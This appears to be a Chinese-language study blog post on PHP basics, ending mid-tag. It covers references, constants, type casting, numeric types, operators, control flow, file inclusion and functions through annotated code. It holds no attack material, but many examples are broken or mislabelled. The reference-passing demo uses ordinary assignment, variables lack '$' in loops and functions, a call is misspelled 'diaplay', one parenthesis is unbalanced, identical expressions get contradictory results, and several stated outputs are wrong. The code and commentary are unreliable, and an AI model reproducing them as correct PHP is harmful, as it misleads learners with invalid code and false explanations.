<h4 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用传递</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.1 执行此行，在栈区开辟一块内存存储$a，在数据段中开辟一块内存保存值1。然后将1所在位置赋值给a变量</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;   </span><br><span class="line"><span class="comment">// 2.2 栈区开辟存储$b；发现是引用运算，故会取出$a的地址，并将该地址给栈区的变量b</span></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>;   <span class="comment">// 值传递</span></span><br><span class="line"><span class="comment">// 2.3 执行该行</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>,<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>

<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量与变量一样，均是用来保存数据的。</p>
<h3 id="常量的基本概念"><a href="#常量的基本概念" class="headerlink" title="常量的基本概念"></a>常量的基本概念</h3><p>const&#x2F;constant:是在程序运行中，不可改变的量（数据）；常量一旦定义，通常不可更改。</p>
<h3 id="常量定义的形式"><a href="#常量定义的形式" class="headerlink" title="常量定义的形式"></a>常量定义的形式</h3><h4 id="定义方式"><a href="#定义方式" class="headerlink" title="定义方式"></a>定义方式</h4><p>1、使用定义常量的函数：define（’常量名’,常量值）——类似于c++的 #define</p>
<p>2、const</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 使用函数定义常量</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;PI&#x27;</span>,<span class="number">3.1415</span>);   <span class="comment">// 注意此处与c++不同，#define 为预处理命令，宏定义，无需加；。。</span></span><br><span class="line"><span class="comment">// 使用const关键字定义</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI1</span> = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义特殊常量</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;^-^&#x27;</span>,<span class="string">&#x27;smile&#x27;</span>);</span><br><span class="line"><span class="comment">// const ^-^   // 报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问常量</span></span><br><span class="line"><span class="keyword">echo</span> PI1;</span><br><span class="line"><span class="comment">// echo ^-^   // 报错</span></span><br><span class="line"><span class="title function_ invoke__">constant</span>(<span class="string">&#x27;^-^&#x27;</span>);  <span class="comment">// 特殊常量的访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 系统常量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>,PHP_VERSION,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,PHP_INI_SIZE,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,PHP_INI_MAX;   <span class="comment">// 有符号整形</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 魔术常量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>,<span class="keyword">__DIR__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="keyword">__FILE__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="keyword">__LINE__</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__LINE__</span>;  <span class="comment">// 输出的行数会变</span></span><br></pre></td></tr></table></figure>

<h4 id="常量命名规则："><a href="#常量命名规则：" class="headerlink" title="常量命名规则："></a>常量命名规则：</h4><p>1、常量不需要使用”$”符号，一旦使用被认为是变量</p>
<p>2、变量名可由数字、字母、下划线命名，但必须以字母和下划线开头（const定义）</p>
<p>3、常量的名字通常是以大写字母为主（与变量以示区别）</p>
<p>4、变量命名的规则比变量要松散，可以使用一些特殊字符（define函数）</p>
<p>5、变量通常不区分大小写，但可以区分（define函数的第三个参数）</p>
<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><p>魔术常量：由双下划线+常量名+双下划线组成，其值会随着环境变化而变化，用户无法改变。</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型：data type，在PHP中指的是数据本身的类型，而不是变量的类型。PHP是一种弱类型语言，变量本身没有数据类型。</p>
<h3 id="PHP八大数据类型"><a href="#PHP八大数据类型" class="headerlink" title="PHP八大数据类型"></a>PHP八大数据类型</h3><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>很多情况需要指定数据类型，需要将外部数据类型（当前PHP获得的数据）转换成目标数据类型。</p>
<h4 id="两种转化方式："><a href="#两种转化方式：" class="headerlink" title="两种转化方式："></a>两种转化方式：</h4><p>1、自动转化：系统根据自己的需求判断，自己转化（用的较多、但效率较低）。</p>
<p>2、强制转换（手动）：在变量之前增加一个()，并在括号里面写上对于的类型，其中NULL特殊，需用unset。</p>
<h4 id="转换说明："><a href="#转换说明：" class="headerlink" title="转换说明："></a>转换说明：</h4><p>1、以字母开头的字符串，永远为0；</p>
<p>2、以数字开头的字符串，取到碰到字符串为止。（不会同时包含两个小数点）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 数据类型</span></span><br><span class="line"><span class="comment">// 创建数据</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;abcd1.1.1&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;1.1.1abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自动转换。算术运算，系统先转化为数值类型，然后运算</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>+<span class="variable">$b</span>;  <span class="comment">//   结果为1.1（0+1.1）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 强制转换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>,(<span class="keyword">float</span>)<span class="variable">$a</span>,(<span class="keyword">float</span>)<span class="variable">$b</span>;  <span class="comment">// 01.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型判断</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$a</span>));         <span class="comment">// bool(FALSE)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$a</span>));      <span class="comment">// bool(TRUE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取数据类型</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettype</span>(<span class="variable">$a</span>);    <span class="comment">// string（虽然前面强制转换了，但并未改变本身）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置类型</span></span><br><span class="line"><span class="comment">// var_dump 输出展示展示代码内容，结构与类型。该函数作可以窥探所有内容的类型，以及内部信息</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">settype</span>(<span class="variable">$b</span>,<span class="string">&#x27;int&#x27;</span>));    <span class="comment">// 先将字符串转换为int型，转换成功返回true，var_dump判断是否为bool型，故显示                                 bool（true）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettype</span>(<span class="variable">$b</span>),<span class="variable">$b</span>;     <span class="comment">// interger1</span></span><br></pre></td></tr></table></figure>

<h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">十进制转换二进制-----&gt;除以2</span></span><br><span class="line"><span class="comment">10  1010  注：不管结果ruhr，均需补足32位：00000000 00000000 00000000 00001010</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// php中提供了很多函数进行转换：</span></span><br><span class="line"><span class="comment">// Decbin():十进制转二进制</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">decbin</span>(<span class="number">107</span>));     <span class="comment">// 结果：string(7) &quot;1101011&quot;</span></span><br><span class="line"><span class="comment">// 同理，还有Decoct():十进制转八进制</span></span><br><span class="line"><span class="comment">// Dechex():十进制转十六进制</span></span><br><span class="line"><span class="comment">// Bindec():二进制转十进制</span></span><br><span class="line"></span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h3 id="浮点数类型"><a href="#浮点数类型" class="headerlink" title="浮点数类型"></a>浮点数类型</h3><p>问：为什么浮点数和整型均占用四个字节，为什么比整型表示的范围大？</p>
<p>整型数据的32位均通过*2转化为十进制。而浮点型中，前八位的后七位为指数，所以表示的范围要大。</p>
<p>另，实际使用时，尽量不用浮点型数字做精确判断，且计算机中凡是小数基本上均不准确。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数的定义</span></span><br><span class="line"><span class="variable">$f1</span> = <span class="number">1.23</span>;</span><br><span class="line"><span class="variable">$f2</span> = <span class="number">1.23e10</span>;</span><br><span class="line"><span class="variable">$f3</span> = PHP_INT_MAX+<span class="number">1</span>;   <span class="comment">// 若整型超过自身存储的大小之后会自动改为浮点型存储</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>,<span class="variable">$f3</span>);</span><br><span class="line"><span class="comment">// 结果：float(1.23)float(1.2300000000) float(214748348)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数判断</span></span><br><span class="line"><span class="variable">$f4</span> = <span class="number">0.7</span>;</span><br><span class="line"><span class="variable">$f5</span> = <span class="number">2.1</span>;</span><br><span class="line"><span class="variable">$f6</span> = <span class="variable">$f5</span>/<span class="number">3</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$f6</span> == <span class="variable">$f4</span>);      <span class="comment">// 结果：bool(false),,因此其不能进行精确判断</span></span><br></pre></td></tr></table></figure>

<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 运算符：是一种将数据进行运算的特殊符号，在PHP中一共有十多种运算符。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 算术运算符   +-*/%</span></span><br><span class="line"><span class="comment">// 比较运算符   &gt; &gt;= &lt; &lt;= ==(数据大小相同即可，无需考虑数据数据类型) != ===(全等于，大小及数据类型均等) !==</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;123&#x27;</span>;  <span class="comment">// 字符串</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">123</span>;  <span class="comment">// 整型</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> == <span class="variable">$b</span>);   <span class="comment">// 结果： bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> === <span class="variable">$b</span>);   <span class="comment">// 结果： bool(false)   不全等于</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 逻辑运算符 &amp;&amp;(左边条件与右边条件同时成立) ||(有一个满足即可) !(取反)</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&#x27;weekend&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="string">&#x27;goods&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span> == <span class="string">&#x27;weekend&#x27;</span> &amp;&amp; <span class="variable">$d</span> == <span class="string">&#x27;good&#x27;</span>);   <span class="comment">// bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span> == <span class="string">&#x27;weekend&#x27;</span> &amp;&amp; <span class="variable">$d</span> == <span class="string">&#x27;good&#x27;</span>);   <span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(!(<span class="variable">$c</span> == good);   <span class="comment">// bool(true)</span></span><br><span class="line">         </span><br><span class="line"><span class="comment">// 连接运算符  .(将字符串连接一起)   .=(将左边内容与右边内容连接起来并重新赋值)</span></span><br><span class="line"><span class="variable">$e</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$e</span> . <span class="variable">$f</span>;   <span class="comment">// hello 123（注意，此处有强制类型转换）</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span> .= <span class="variable">$e</span>;      </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$e</span>;       <span class="comment">// hello 123</span></span><br><span class="line">     </span><br><span class="line"><span class="comment">// 错误抑制符：@(可能出错的表达式)，在PHP中有一些错误可以提前预知，但又不想报错，这就需要错误抑制符。</span></span><br><span class="line"><span class="variable">$g</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span> % <span class="variable">$g</span>;    <span class="comment">// 此时会报错</span></span><br><span class="line"><span class="keyword">echo</span> @(<span class="variable">$f</span> % <span class="variable">$g</span>); <span class="comment">// 不会报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 三目运算符(问号表达式) 表达式1 ？ 表达式2：表达式3</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$g</span> ==<span class="number">0</span>?<span class="number">1</span>:<span class="number">2</span>;</span><br><span class="line">   </span><br><span class="line"><span class="comment">// 自操作运算符 ++ --(前置或后置如果只有自操作，则效果一致)</span></span><br><span class="line"><span class="variable">$i</span> = <span class="variable">$g</span>++;    <span class="comment">// $g = 1;  $i = 0</span></span><br><span class="line"><span class="variable">$i</span> = ++<span class="variable">$g</span>;    <span class="comment">// $g = 2;  $i = 2;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 位运算符</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">	计算机码：计算机在实际存储数据时，采用的编码规则(二进制规则)</span></span><br><span class="line"><span class="comment">	计算机码：原码、反码和补码。数值本身最左边一位用来充当符号位：正数为0，负数为1；</span></span><br><span class="line"><span class="comment">	原码:数据本身从十进制转换成二进制得到的结果</span></span><br><span class="line"><span class="comment">	     正数，左符号位为0         负数：右符号位为1</span></span><br><span class="line"><span class="comment">	反码：针对负数，符号位不变，其他位取反。</span></span><br><span class="line"><span class="comment">	补码：针对负数，反码+1.（系统中存的为补码）</span></span><br><span class="line"><span class="comment">	以0为例，若是原码，则+0 = 00000000  -0 = 10000000；二者不一样</span></span><br><span class="line"><span class="comment">	         -0 反码 11111111   -0 补码 00000000   与+0一样（正数原码、补码、反码为其本身）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$j</span> = <span class="number">5</span>;      <span class="comment">// 原码：00000101</span></span><br><span class="line"><span class="variable">$k</span> = -<span class="number">5</span>;     <span class="comment">// 原码：10000101  反码：11111010  补码：11111011</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 位运算：取出计算机中最小的单位（bit）进行运算  &amp; | ~(按位取反) ^(按位异或) &gt;&gt;(右移) &lt;&lt;(左移)</span></span><br><span class="line"><span class="comment">// 注：1、系统进行位运算时，均是利用补码进行运算的     2、运算结束之后，必须转换为原码进行显示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 按位取与         </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$j</span> &amp; <span class="variable">$k</span>);    <span class="comment">// int(1)</span></span><br><span class="line"><span class="comment">/*    5  00000101</span></span><br><span class="line"><span class="comment">     -5  11111011</span></span><br><span class="line"><span class="comment">      &amp;  00000001  判断：符号位为0，正数，所存即为原码，无需操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 按位取反</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(~ <span class="variable">$k</span>);       <span class="comment">// int(4)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     -5  11111011</span></span><br><span class="line"><span class="comment">      ~  00000100  正数即为原码，</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">         </span><br><span class="line"><span class="comment">// 按位左移</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$k</span> &gt;&gt; <span class="number">1</span>)   <span class="comment">// int(-3)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$k</span> &gt;&gt; <span class="number">2</span>)   <span class="comment">// int(-2)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     -5  11111011</span></span><br><span class="line"><span class="comment">    &gt;&gt;2  11111110(右移补符号位)</span></span><br><span class="line"><span class="comment">   反码  11111101(补码-1)</span></span><br><span class="line"><span class="comment">   原码  10000010(除符号位均取反)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">         </span><br><span class="line"><span class="comment">// 运算符优先级</span></span><br></pre></td></tr></table></figure>

<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><p><strong>分类</strong>：顺序结构、分支结构（if分支与switch分支）、循环结构</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分支结构——if分支</span></span><br><span class="line"><span class="variable">$day</span> = <span class="string">&#x27;星期天&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$day</span> == <span class="string">&#x27;星期1&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;go out&#x27;</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;work&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch 分支：同一条件下，有多个值，且每个值对应一种操作</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">switch(条件表达式)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    case 值1:</span></span><br><span class="line"><span class="comment">        代码;</span></span><br><span class="line"><span class="comment">        break;</span></span><br><span class="line"><span class="comment">    case 值1:</span></span><br><span class="line"><span class="comment">        代码;</span></span><br><span class="line"><span class="comment">        break;</span></span><br><span class="line"><span class="comment">    default:</span></span><br><span class="line"><span class="comment">        代码;</span></span><br><span class="line"><span class="comment">        break;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环结构 for循环、while循环、Do-While循环、foreach循环（针对数组）</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// while  Do-while循环</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> &lt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环控制</span></span><br><span class="line"><span class="comment">// 1、中断控制：重新开始从头循环 continue(需求，输出1-100的5的倍数)  </span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> &lt;= <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span> % <span class="number">5</span> != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$i</span>++ ;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="流程控制替代语法"><a href="#流程控制替代语法" class="headerlink" title="流程控制替代语法"></a>流程控制替代语法</h3><p>上述书写中(tr 代表表格的一行，td代表表格的一列)，大括号很容易丢失，所以PHP有了一种替代机制，让其可以不用书写大括号。</p>
<p><em>for(;;){   &#x3D;&gt; :      }&#x3D;&gt;endfor;</em></p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含：在一个PHP脚本中，将另外一个文件包含进来，合作完成一件事情。</p>
<h3 id="文件包含作用"><a href="#文件包含作用" class="headerlink" title="文件包含作用"></a>文件包含作用</h3><p>1、要么使用被包含文件中的内容，实现代码共享，向上包含（索要）</p>
<p>2、要么自己的东西可被使用，向下包含（给予）：自己有某个东西需要别的脚本显示。</p>
<p>最大的作用是分工协作，共同完成一件事情。</p>
<h3 id="文件包含四种形式"><a href="#文件包含四种形式" class="headerlink" title="文件包含四种形式"></a>文件包含四种形式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含文件：使用数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含文件：include  include_once(系统自动判断文件包含当中，是否已被包含过)  require  require_once</span></span><br><span class="line"><span class="comment">// 向上包含：使用已准备好的文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;include1.php&#x27;</span>;  <span class="comment">// 包含当前文件所在文件夹下的include1.php文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>,PI;              <span class="comment">// include1.php中已定义这个变量和常量，故可直接使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 向下包含：类似于调用了子函数</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;display.php&#x27;</span>;   <span class="comment">// 该文件中可输出a和PI</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="文件加载原理"><a href="#文件加载原理" class="headerlink" title="文件加载原理"></a>文件加载原理</h3><h4 id="PHP代码执行流程："><a href="#PHP代码执行流程：" class="headerlink" title="PHP代码执行流程："></a>PHP代码执行流程：</h4><p>1、读取代码文件（相当于PHP程序）；</p>
<p>2、编译：将PHP代码转化成字节码（二进制），生成opcode（php可解析的代码）；</p>
<p>3、针对引擎来解析opcode，按照细节码进行逻辑运算；</p>
<p>4    转化成对应的html代码。</p>
<p>1、在文件加载（include 或 require）时，系统会自动嵌入对应的include位置</p>
<p>2、在PHP中，被包含的文件是单独编译的。。</p>
<p>若编译过程中报错，则会失败，不执行。但若是被包含文件有错误，则系统执行到include语句时，才回报错。</p>
<h4 id="include-和-require区别"><a href="#include-和-require区别" class="headerlink" title="include 和 require区别"></a>include 和 require区别</h4><p>include会执行多次，导致报错（重复定义变量）。。而include_once不会出现这种情况。</p>
<p>require和include区别在于：若未包含文件，则报错形式不一样。（require包含错误文件，则include后不再执行；include未包含文件，会警告，但是仍会执行后面的。）</p>
<h3 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h3><p>文件加载时需指定文件路径，才能保证PHP正确找到对应的文件。</p>
<p>1、绝对路径（从磁盘根目录开始—本地绝对路径；从网站根目录开始—网络绝对路径–相对于&#x2F;的路径，，&#x2F;相当于绝对路径）</p>
<p>2、相对路径：从当前文件所在目录开始的路径。。.或者.&#x2F;表示当前文件夹。。..&#x2F;上级目录</p>
<p>绝对路径和相对路径加载区别：绝对路径相对效率偏低（因为要从跟目录开始找，但相对安全，路径固定）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 文件加载路径</span></span><br><span class="line"><span class="comment">// 相对路径加载(只供演示，不考虑多次加载)</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;include1.php&#x27;</span>;  <span class="comment">// 不写路径，默认在当前文件夹下</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;./include1.php&#x27;</span>; <span class="comment">// 另一种形式</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../hostdoc/include1.php&#x27;</span>;  <span class="comment">// ../代表当前文件夹的上一个文件夹，hostdoc为当前文件夹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 绝对路径</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;E:/server/apache/htdocs/include1.php&#x27;</span>;   <span class="comment">// 绝对路径，不会出错</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="文件嵌套包含"><a href="#文件嵌套包含" class="headerlink" title="文件嵌套包含"></a>文件嵌套包含</h3><p><strong>嵌套包含容易出现相对路径出错的问题。</strong></p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>将实现某一功能的代码块封装到一个结构中，从而实现代码的复用。</p>
<h3 id="函数定义语法（与c的差别在于可在任意位置调用子函数）"><a href="#函数定义语法（与c的差别在于可在任意位置调用子函数）" class="headerlink" title="函数定义语法（与c的差别在于可在任意位置调用子函数）"></a>函数定义语法（与c的差别在于可在任意位置调用子函数）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Function 函数名(参数)&#123;</span></span><br><span class="line"><span class="comment">	函数体</span></span><br><span class="line"><span class="comment">	返回值</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 函数的定义</span></span><br><span class="line"><span class="comment">// 1、函数不会自动运行，必须调用才可</span></span><br><span class="line"><span class="comment">// 2、代码执行阶段，遇到函数名字才回调用，不是在编译阶段</span></span><br><span class="line"><span class="comment">// 3、函数调用可在声明之前</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;   <span class="comment">// 没有返回值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数的调用（）</span></span><br><span class="line"><span class="title function_ invoke__">diaplay</span>();   <span class="comment">// 若函数有参数，则需加参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数命名规范：字母数字下划线、但不能数字开头。</span></span><br><span class="line"><span class="comment">// 一半遵循以下规则：1、驼峰法：除第一个单词外，其余首字母大写。showParent()   2、下划线方式</span></span><br><span class="line"><span class="comment">// 在一个脚本函数周期中，不允许出现同名函数。</span></span><br></pre></td></tr></table></figure>

<h3 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数:定义函数时使用的参数，形参</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> arg1+arg2;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数时使用的参数，实参</span></span><br><span class="line"><span class="variable">$num1</span> = <span class="number">10</span>;</span><br><span class="line"><span class="title function_ invoke__">add</span>(<span class="variable">$num1</span>,<span class="number">20</span>);  <span class="comment">// 1、实参个数可以多于形参（不能少于），只是函数不用而已  2、理论上实参个数没有限制</span></span><br><span class="line"><span class="comment">/* 调用过程：1、系统调用add函数时，会去内存中找是否有add函数</span></span><br><span class="line"><span class="comment">             2、系统在栈区开辟内存空间运行函数add</span></span><br><span class="line"><span class="comment">             3、系统查看函数本身是否有形参</span></span><br><span class="line"><span class="comment">             4、系统判断调用函数时是否有实参</span></span><br><span class="line"><span class="comment">             5、系统默认会将实参$num、20分别赋值给形参</span></span><br><span class="line"><span class="comment">             6、执行函数体、运行</span></span><br><span class="line"><span class="comment">             7、返回值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认值：形参的默认值。。若调用时没有提供实参，则函数使用默认值执行函数</span></span><br><span class="line"><span class="comment">// 注：1、默认值定义时，应放在后边，不能左边有默认值，而右边没有</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">moren</span>(<span class="params"><span class="variable">$num1</span> = <span class="number">0</span>,<span class="variable">$num2</span> =<span class="number">0</span></span>)  // 当前的<span class="title">num1</span>是形参，编译时不执行。且如果外部有同名子变量，也不会冲突</span></span><br><span class="line"><span 